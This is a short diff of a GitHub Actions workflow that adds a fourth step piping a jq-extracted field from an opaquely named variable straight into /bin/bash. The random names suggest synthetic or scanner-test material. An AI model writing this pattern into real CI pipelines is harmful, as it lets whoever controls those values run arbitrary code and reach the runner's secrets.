@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$gtg40" | jq -r .uklcl0 | /bin/bash
           printf '%s' "$hm405" | jq -r .x8 | /bin/bash
           printf '%s' "$xrb0004" | jq -r .opym56654 | /bin/bash
+          echo $j3 | jq -r .jcvhn28 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
